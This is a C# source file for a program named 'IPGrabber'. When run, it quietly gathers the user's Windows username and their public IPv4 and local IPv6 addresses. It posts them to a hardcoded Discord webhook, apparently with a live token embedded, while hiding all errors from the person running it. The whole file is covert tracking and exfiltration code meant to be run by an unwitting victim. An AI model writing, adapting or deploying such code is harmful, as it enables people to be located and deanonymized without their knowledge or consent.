using System;
using System.Net.Http;
using System.Net;
using System.Threading.Tasks;

namespace IPGrabber
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // Your Discord webhook URL
            string webhookUrl = "https://discord.com/api/webhooks/1227818343893827605/l3hdx3qasxBjEHKHIL90cZoo2yS1ohSYeO0X03ueGmzIblDulFIbhqDHSAY7MFHl-Fls";

            // Message to send
            string message = $@"
@everyone @here
```
HEY! NEW LOGIN FROM ({Environment.UserName}):
IPv4 Address: {await GetIPv4()}
IPv6 Address: {GetIPv6()}
Username: {Environment.UserName}
```
";

            await SendMessageToWebhook(webhookUrl, message);
        }

        static async Task SendMessageToWebhook(string webhookUrl, string message)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var payload = new
                    {
                        content = message
                    };

                    var content = new StringContent(Newtonsoft.Json.JsonConvert.SerializeObject(payload));
                    content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");

                    var response = await client.PostAsync(webhookUrl, content);

                    if (response.IsSuccessStatusCode)
                    {
                    }
                    else
                    {
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }

        static async Task<string> GetIPv4()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var response = await client.GetStringAsync("https://api.ipify.org");
                    return response;
                }
            }
            catch (Exception ex)
            {
                return string.Empty;
            }
        }

        static string GetIPv6()
        {
            string ipv6 = string.Empty;
            foreach (IPAddress ip in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
                {
                    ipv6 = ip.ToString();
                    break;
                }
            }
            return ipv6;
        }
    }
}
